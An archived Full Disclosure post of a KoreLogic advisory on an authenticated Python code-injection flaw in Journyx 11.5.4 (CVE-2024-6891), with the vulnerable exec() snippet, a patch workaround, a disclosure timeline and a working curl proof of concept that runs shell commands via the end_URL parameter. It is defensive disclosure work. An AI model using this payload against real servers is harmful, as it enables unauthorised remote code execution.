---
title: KL-001-2024-008: Journyx Authenticated Remote Code Execution
url: https://seclists.org/fulldisclosure/2024/Aug/6
source: Full Disclosure
date: 2024-08-08
fetch_date: 2025-10-06T18:08:49.892912
---

# KL-001-2024-008: Journyx Authenticated Remote Code Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# KL-001-2024-008: Journyx Authenticated Remote Code Execution

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 7 Aug 2024 18:52:18 -0500

---

```
KL-001-2024-008: Journyx Authenticated Remote Code Execution

Title: Journyx Authenticated Remote Code Execution
Advisory ID: KL-001-2024-008
Publication Date: 2024.08.07
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-008.txt

1. Vulnerability Details

     Affected Vendor: Journyx
     Affected Product: Journyx (jtime)
     Affected Version: 11.5.4
     Platform: GNU/Linux
     CWE Classification: CWE-94: Improper Control of Generation of Code
                         ('Code Injection'), CWE-95: Improper Neutralization
                         of Directives in Dynamically Evaluated Code
                         ('Eval Injection')
     CVE ID: CVE-2024-6891

2. Vulnerability Description

     Attackers with a valid username and password can exploit
     a python code injection vulnerability during the natural
     login flow.

3. Technical Description

     When utilizing a username and password to authenticate to
     Journyx via the web interface, an HTTP request is sent to
     "wtlogin.pyc" containing the credentials. Upon a successful
     login, the user is redirected to "wte.pyc" or the URL specified
     in the "end_URL" body parameter if one is supplied.

     An additional condition is present, however. If the
     "end_URL" value is over 1,000 characters, the value is instead
     interpolated into a python "import" statement which is passed
     into the "exec()" function, thereby executing arbitrary code.

     Code snippet from "wtlogin.pyc":

     finalURL = end_URL + '.pyc?' + genlib.URLEncodeParams(params)
     if len(finalURL) < 1000:
         raise genlib.HTTP302Found(finalURL)
     else:
         exec('import %s; %s.main()' % (end_URL, end_URL))

     The "params" variable is derived from the query parameters
     included in the login request, so the size of "finalURL"
     is trivial to inflate.

4. Mitigation and Remediation Recommendation

     The vendor reports that this issue was remediated in Journyx
     v12.0.0, which is the first wholly cloud-hosted version of
     this product.

     For self-hosted instances of JournyX, additional security
     measures (such as input sanitization) can be added by monkey
     patching the PYC file responsible for handling request
     parameters (mycgi.pyc).

     1) Rename "mycgi.pyc" to an alternative name, e.g. mycgi_original.pyc.
          $ mv wt_tar/pi/pylib/wtlib/mycgi.py wt_tar/pi/pylib/wtlib/mycgi_original.py

     2) Create a file named "mycgi.py" in the same directory.
          $ touch wt_tar/pi/pylib/wtlib/mycgi.py

     3) Insert the following code into the newly created "mycgi.py"

          from mycgi_original import *
          from html import escape

          def patch():
              pdata = _parse()

              # force the value of "end_URL" to always be "wte"
              if pdata.get('end_URL'): pdata['end_URL'] = ['wte']

              # sanitize user-controlled error messages
              for parameter in ['error', 'error_description']:
                  if not pdata.get(parameter): continue
                  pdata[parameter] = [escape(value) for value in pdata[parameter]]

              return pdata

          _parse = parse
          parse  = patch

     Once these changes have been made, the JournyX native "mycgi.parse()"
     function will be overwritten with the "patch()" function located in the
     "mycgi.py" file. Relevant to this advisory, the patch provided above
     will force the "end_URL" parameter to always have a value of "wte".

5. Credit

     This vulnerability was discovered by Jaggar Henry of KoreLogic, Inc.

6. Disclosure Timeline

     2024.01.31 - KoreLogic notifies Journyx support of the intention to
                  report vulnerabilities discovered in the licensed,
                  on-premises version of the product.
     2024.01.31 - Journyx acknowledges receipt.
     2024.02.02 - KoreLogic requests a meeting with Journyx support to share
                  vulnerability details.
     2024.02.07 - KoreLogic reports vulnerability details to Journyx.
     2024.02.09 - Journyx responds that this vulnerability has been remediated
                  in the cloud-hosted version of the product.
     2024.02.21 - KoreLogic offers to test the cloud version to confirm
                  the fix; no response.
     2024.07.01 - KoreLogic notifies Journyx of impending public disclosure.
     2024.07.09 - Journyx confirms version number of the remediation.
     2024.08.07 - KoreLogic public disclosure.

7. Proof of Concept

    By leveraging the existing "web" python module, it is possible
    to see the output of shell commands as returned by "os.popen()".

    [attacker@box]$ HOST='redacted.com'; PORT='8080'; USERNAME='employee'; PASSWORD='password123'; COMMAND='id'; \
                    curl -x http://localhost:8080 -X POST \
```

                         -d
"wtusername=$USERNAME&wtpassword=$PASSWORD&end\_URL=os,web%0aweb.response.text%3dos.popen('$COMMAND').read()#&timestamp=9999999999&pageid=$RANDOM"
\

```
                         -H 'Cookie: wtsession=foobar' \
"http://$HOST:$PORT/jtcgi/wtlogin.pyc?z=$(printf 'Z%.0s' {1..1000})"
```

    uid=1000(foo) gid=1000(foo)
groups=1000(foo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)

```
    [attacker@box]$

The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-6/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **KL-001-2024-008: Journyx Authenticated Remote Code Execution** *KoreLogic Disclosures via Fulldisclosure (Aug 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/b...